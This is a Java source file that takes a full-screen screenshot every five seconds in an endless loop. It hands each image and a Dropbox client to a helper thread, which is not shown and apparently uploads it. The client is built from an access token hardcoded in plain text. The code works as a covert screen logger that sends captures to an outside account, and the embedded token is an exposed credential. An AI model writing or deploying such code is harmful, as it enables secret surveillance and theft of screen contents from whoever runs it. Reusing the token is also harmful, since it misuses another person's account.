package ru;

import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;

public class Main {

    public static void main(String[] args) {
        String ACCESS_TOKEN = "sl.Aq8uv8FLiluX4j7Fuvx-MQgWA6BoqPCGC0GPCikh4wc7sxL-A3tHmbEPRRkXvXztfnIrcV060wy0yvHmx7wo-4wI83JVdE7jxucAwLVwyn13xTWEd18gko0DiHrdnqcYBYiEegc";

        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);

        for(;;){
            BufferedImage image = null;
            try{
                image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));;
            } catch (Exception ex){
                ex.printStackTrace();
            }

            MyThread thread = new MyThread(client, image);
            thread.start();

            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }


    }
}
